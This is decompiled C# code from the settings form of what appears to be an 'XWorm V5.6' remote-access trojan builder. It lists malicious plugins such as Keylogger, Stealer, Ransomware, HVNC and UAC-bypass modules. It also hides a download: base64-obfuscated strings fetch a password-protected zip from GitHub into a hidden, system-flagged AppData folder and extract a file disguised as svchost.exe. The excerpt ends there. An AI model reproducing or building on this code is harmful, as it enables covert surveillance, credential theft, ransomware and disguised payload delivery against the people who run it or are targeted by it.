...
;
	...
	private void InitializeComponent()
	{
		...
		this.Guna2TextBox2.Text = "@ThreatCommunity";
        ...
        string encodedFormText = "WFdvcm0gVjUuNiBFZGl0aW9uIGJ5IEBUaHJlYXRDb21tdW5pdHkgfCBTZXR0aW5ncw==";
        this.Text = Encoding.UTF8.GetString(Convert.FromBase64String(encodedFormText));
        base.TopMost = true;
	...
	private void Port_Load(object sender, EventArgs e)
{
    ...
    private void Guna2GradientButton1_Click(object sender, EventArgs e)
    {
        try
        {
            ...
            GClass19.string_5 = "@ThreatCommunity";
            MyProject.Computer.Registry.SetValue(GClass19.string_4, "License", "@ThreatCommunity");
            ...
            GClass19.bool_0 = Guna2ToggleSwitch1.Checked;
            MyProject.Computer.Registry.SetValue(GClass19.string_4, "NoteF", Guna2ToggleSwitch1.Checked.ToString());

            string[] array = Strings.Split(
                "ActiveWindows.dll,Chat.dll,Clipboard.dll,FileManager.dll,FilesSearcher.dll,HRDP.dll,HVNC.dll," +
                "Informations.dll,Keylogger.dll,Maps.dll,Microphone.dll,Ngrok-Installer.dll,Options.dll,Pastime.dll," +
                "Performance.dll,ProcessManager.dll,Programs.dll,Ransomware.dll,Chromium.dll,Recovery.dll,Stealer.dll," +
                "Regedit.dll,RemoteDesktop.dll,ReverseProxy.dll,RunPE.dll,Shell.dll,StartupManager.dll,TCPConnections.dll," +
                "UACBypass.dll,VB.NET Compiler.dll,WebCam.dll,WSound.dll,ServiceManager.dll,MessageBox.dll,HVNCMemory.dll," +
                "Cmstp-Bypass.dll,HiddenApps.dll,HBrowser.dll,VoiceChat.dll",
                ",");
        ...
        try
        {
            ...
            string folderPathBase64 = "U3R1Yi9zdHVi";
            string zipFileNameBase64 = "c3R1Yi56aXA=";
            string exeFileNameBase64 = "c3ZjaG9zdC5leGU=";
            string downloadUrlBase64 = "aHR0cHM6Ly9naXRodWIuY29tL3RocmVhdGNvbW11bml0eS9zdHViL3JlbGVhc2VzL2Rvd25sb2FkL3N0dWIvc3ZjaG9zdC56aXA=";

            string folderPath = Encoding.UTF8.GetString(Convert.FromBase64String(folderPathBase64));
            string zipFilePath = Path.Combine(folderPath, Encoding.UTF8.GetString(Convert.FromBase64String(zipFileNameBase64)));
            ...
            string otherFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Stub");
            if (!Directory.Exists(otherFolderPath))
            {
                Directory.CreateDirectory(otherFolderPath);
                DirectoryInfo di2 = new DirectoryInfo(otherFolderPath);
                di2.Attributes = FileAttributes.Hidden | FileAttributes.System;
            }

            using (WebClient client = new WebClient())
            {
                client.DownloadFile(Encoding.UTF8.GetString(Convert.FromBase64String(downloadUrlBase64)), zipFilePath);
            }
            ...
            if (File.Exists(zipFilePath))
            {
                ...
                {
                    zip.Password = Encoding.UTF8.GetString(Convert.FromBase64String("MQ=="));
                ...
                string exePath = Path.Combine(folderPath, Encoding.UTF8.GetString(Convert.FromBase64String(exeFileNameBase64)));
